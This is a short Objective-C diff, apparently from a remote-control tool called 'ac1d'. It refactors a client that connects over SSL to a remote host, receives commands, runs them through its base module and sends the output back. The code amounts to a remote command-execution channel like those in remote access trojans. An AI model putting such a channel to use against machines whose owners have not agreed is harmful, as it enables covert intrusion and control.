@@ -58,14 +58,19 @@ int main(int argc, const char *argv[]) {
                     NSString *str = [[NSString alloc] initWithCString:argv[i] encoding:NSUTF8StringEncoding];
                     [command_args addObject:str];
                 }
-                if ([commands containsObject:args[2]]) [ac1d_base sendCommand:YES:command_args];
-                else {
+                if ([commands containsObject:args[2]]) {
+                    printf("%s", [[ac1d_base sendCommand:command_args] UTF8String]);
+                } else {
                     showHelpMessage();
                 }
             } else showHelpMessage();
         }
     }
     return 0;
+}
+
+void sendString(NSString *string) {
+    SSL_write(client_ssl, [string UTF8String], (int)string.length);
 }
 
 void interactWithServer(NSString *remoteHost, int remotePort) {
@@ -76,7 +81,9 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
         NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
         
-        if ([commands containsObject:args[0]]) [ac1d_base sendCommand:NO:args];
+        if ([commands containsObject:args[0]]) {
+            sendString([ac1d_base sendCommand:args]);
+        }
         memset(buffer, '\0', 2048);
     }
 }
